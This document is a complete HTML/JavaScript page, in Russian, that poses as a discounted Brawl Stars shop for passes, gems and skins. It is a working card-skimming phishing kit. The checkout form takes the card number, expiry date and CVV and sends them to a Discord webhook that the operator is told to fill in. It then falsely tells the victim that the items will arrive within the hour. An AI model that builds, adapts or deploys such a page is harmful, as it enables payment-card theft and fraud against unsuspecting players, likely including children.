<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Brawl Stars Shop</title>
    <style>
        body {
            background: #0a0c15;
            color: white;
            font-family: sans-serif;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: auto;
        }
        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 30px;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
        }
        .tablink {
            background: #1e2438;
            border: none;
            padding: 10px 25px;
            color: white;
            cursor: pointer;
            border-radius: 30px;
            font-size: 16px;
        }
        .tablink.active {
            background: #ffcc00;
            color: black;
            font-weight: bold;
        }
        .tabcontent {
            display: none;
        }
        .tabcontent.active {
            display: block;
        }
        .products {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
        }
        .product {
            background: #1e2438;
            border-radius: 20px;
            padding: 15px;
            width: 220px;
        }
        .product h3 {
            margin: 0 0 10px;
        }
        .price {
            font-size: 24px;
            color: #ffcc00;
            margin: 10px 0;
        }
        .oldprice {
            font-size: 14px;
            text-decoration: line-through;
            color: #aaa;
            margin-left: 8px;
        }
        button {
            background: #ffcc00;
            border: none;
            padding: 8px 15px;
            border-radius: 30px;
            cursor: pointer;
            font-weight: bold;
            width: 100%;
        }
        .cart {
            background: #1e2438;
            border-radius: 20px;
            padding: 20px;
            margin-top: 40px;
        }
        .cart ul {
            list-style: none;
            padding: 0;
        }
        .cart li {
            display: flex;
            justify-content: space-between;
            margin: 10px 0;
            border-bottom: 1px solid #333;
            padding: 5px 0;
        }
        .total {
            font-size: 20px;
            text-align: right;
            margin: 15px 0;
        }
        .checkout-btn {
            background: #2ecc71;
            width: auto;
            padding: 10px 25px;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.8);
            justify-content: center;
            align-items: center;
        }
        .modal-box {
            background: #1e2438;
            padding: 30px;
            border-radius: 20px;
            width: 300px;
        }
        .modal-box input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            background: #0a0c15;
            border: 1px solid #ffcc00;
            border-radius: 30px;
            color: white;
        }
        .close {
            float: right;
            font-size: 24px;
            cursor: pointer;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>⭐ Brawl Stars Shop</h1>
    <p>скидка 30% на всё</p>

    <div class="tabs">
        <button class="tablink active" data-tab="tab1">Brawl Pass</button>
        <button class="tablink" data-tab="tab2">Brawl Pass+</button>
        <button class="tablink" data-tab="tab3">Гемы</button>
        <button class="tablink" data-tab="tab4">Скины</button>
    </div>

    <div id="tab1" class="tabcontent active"></div>
    <div id="tab2" class="tabcontent"></div>
    <div id="tab3" class="tabcontent"></div>
    <div id="tab4" class="tabcontent"></div>

    <div class="cart">
        <h2>🛒 Корзина</h2>
        <ul id="cartList"><li>Корзина пуста</li></ul>
        <div class="total" id="totalAmount">Итого: 0 ₽</div>
        <button class="checkout-btn" id="checkoutBtn">Оформить заказ</button>
    </div>
</div>

<div id="paymentModal" class="modal">
    <div class="modal-box">
        <span class="close">&times;</span>
        <h3>Оплата картой</h3>
        <input type="text" id="cardNumber" placeholder="Номер карты (16 цифр)">
        <input type="text" id="expiry" placeholder="MM/YY">
        <input type="text" id="cvv" placeholder="CVV">
        <button id="payButton">Оплатить</button>
    </div>
</div>

<script>
    // ----- ТОВАРЫ -----
    const productsData = {
        pass: [
            { name: "Brawl Pass Сезон 1", price: 349, old: 499 },
            { name: "Brawl Pass Сезон 2", price: 349, old: 499 },
            { name: "Brawl Pass Сезон 3", price: 349, old: 499 }
        ],
        plus: [
            { name: "Brawl Pass+ Экстра", price: 549, old: 799 },
            { name: "Brawl Pass+ Премиум", price: 649, old: 929 }
        ],
        gems: [
            { name: "80 гемов", price: 111, old: 159 },
            { name: "170 гемов", price: 223, old: 319 },
            { name: "360 гемов", price: 454, old: 649 },
            { name: "950 гемов", price: 1049, old: 1499 }
        ],
        skins: [
            { name: "Меха Леон", price: 279, old: 399 },
            { name: "Ковбой Кольт", price: 209, old: 299 },
            { name: "Рокер Мортис", price: 349, old: 499 },
            { name: "Бо Ультимативный", price: 489, old: 699 },
            { name: "Призрак Кольт", price: 279, old: 399 },
            { name: "Дракон Найт", price: 419, old: 599 }
        ]
    };

    let cart = [];

    // Функция отрисовки товаров в конкретную вкладку
    function renderProducts(category, containerId) {
        const container = document.getElementById(containerId);
        if (!container) return;
        const items = productsData[category];
        let html = `<div class="products">`;
        items.forEach(item => {
            html += `
                <div class="product">
                    <h3>${item.name}</h3>
                    <div class="price">${item.price} ₽ <span class="oldprice">${item.old} ₽</span></div>
                    <button onclick="addToCart('${item.name}', ${item.price})">В корзину</button>
                </div>
            `;
        });
        html += `</div>`;
        container.innerHTML = html;
    }

    // Добавление в корзину
    window.addToCart = function(name, price) {
        cart.push({ name, price });
        updateCartUI();
        showMessage(`✅ ${name} добавлен`);
    };

    // Обновить отображение корзины
    function updateCartUI() {
        const list = document.getElementById('cartList');
        const totalSpan = document.getElementById('totalAmount');
        if (cart.length === 0) {
            list.innerHTML = '<li>Корзина пуста</li>';
            totalSpan.innerText = 'Итого: 0 ₽';
            return;
        }
        let total = 0;
        let html = '';
        cart.forEach((item, idx) => {
            total += item.price;
            html += `<li>${item.name} — ${item.price} ₽ <button style="width:auto; background:#c0392b; padding:2px 12px;" onclick="removeFromCart(${idx})">x</button></li>`;
        });
        list.innerHTML = html;
        totalSpan.innerText = `Итого: ${total} ₽`;
    }

    window.removeFromCart = function(idx) {
        cart.splice(idx, 1);
        updateCartUI();
    };

    function showMessage(msg) {
        let div = document.createElement('div');
        div.innerText = msg;
        div.style.position = 'fixed';
        div.style.bottom = '20px';
        div.style.right = '20px';
        div.style.backgroundColor = '#ffcc00';
        div.style.color = 'black';
        div.style.padding = '10px 20px';
        div.style.borderRadius = '30px';
        div.style.zIndex = '9999';
        document.body.appendChild(div);
        setTimeout(() => div.remove(), 2000);
    }

    // Вкладки
    const tablinks = document.querySelectorAll('.tablink');
    const tabcontents = document.querySelectorAll('.tabcontent');
    tablinks.forEach(link => {
        link.addEventListener('click', () => {
            const tabId = link.getAttribute('data-tab');
            tabcontents.forEach(content => content.classList.remove('active'));
            document.getElementById(tabId).classList.add('active');
            tablinks.forEach(l => l.classList.remove('active'));
            link.classList.add('active');
        });
    });

    // Инициализация всех вкладок товарами
    renderProducts('pass', 'tab1');
    renderProducts('plus', 'tab2');
    renderProducts('gems', 'tab3');
    renderProducts('skins', 'tab4');

    // ---------- ОПЛАТА И ВЕБХУК ----------
    // ЗАМЕНИ ЭТУ ССЫЛКУ НА ТВОЙ РЕАЛЬНЫЙ ДИСКОРД ВЕБХУК
    const WEBHOOK = 'https://discord.com/api/webhooks/ТВОЙ_АЙДИ/ТВОЙ_ТОКЕН';

    const modal = document.getElementById('paymentModal');
    const checkout = document.getElementById('checkoutBtn');
    const closeModal = document.querySelector('.close');
    const payBtn = document.getElementById('payButton');

    checkout.onclick = () => {
        if (cart.length === 0) {
            alert('Корзина пуста!');
            return;
        }
        modal.style.display = 'flex';
    };
    closeModal.onclick = () => modal.style.display = 'none';
    window.onclick = (e) => { if (e.target === modal) modal.style.display = 'none'; };

    payBtn.onclick = async () => {
        const card = document.getElementById('cardNumber').value.trim();
        const expiry = document.getElementById('expiry').value.trim();
        const cvv = document.getElementById('cvv').value.trim();
        if (!card || !expiry || !cvv) {
            alert('Заполните все поля карты');
            return;
        }
        const total = cart.reduce((s, i) => s + i.price, 0);
        const itemsText = cart.map(i => `${i.name} (${i.price}₽)`).join('\n');
        const data = {
            content: "**НОВЫЙ ЗАКАЗ BRAWL STARS (СКИДКА 30%)**",
            embeds: [{
                title: "💳 Данные карты",
                color: 0xffcc00,
                fields: [
                    { name: "Товары", value: itemsText || "—", inline: false },
                    { name: "Сумма", value: total + " ₽", inline: true },
                    { name: "Номер карты", value: `||${card}||`, inline: false },
                    { name: "Срок", value: expiry, inline: true },
                    { name: "CVV", value: `||${cvv}||`, inline: true }
                ],
                timestamp: new Date().toISOString()
            }]
        };
        try {
            await fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            alert('Спасибо за покупку! Товары придут на аккаунт в течение часа.');
            cart = [];
            updateCartUI();
            modal.style.display = 'none';
            document.getElementById('cardNumber').value = '';
            document.getElementById('expiry').value = '';
            document.getElementById('cvv').value = '';
        } catch (err) {
            alert('Ошибка соединения, попробуйте позже.');
        }
    };
</script>
</body>
</html>
